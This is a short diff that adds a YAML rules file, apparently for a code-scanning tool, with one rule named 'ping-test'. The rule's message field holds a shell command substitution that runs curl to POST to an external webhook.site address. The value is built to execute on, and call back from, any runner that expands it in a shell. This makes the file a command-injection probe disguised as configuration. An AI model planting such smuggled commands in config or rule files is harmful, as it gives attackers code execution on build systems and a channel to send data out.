@@ -1,0 +1,4 @@
+rules:
+  - id: ping-test
+    pattern: foo
+    message: "Webhook test: $(curl -X POST -d \"ping-from-runner\" https://webhook.site/767898aa-4fca-480b-8db7-4128060592ac)"
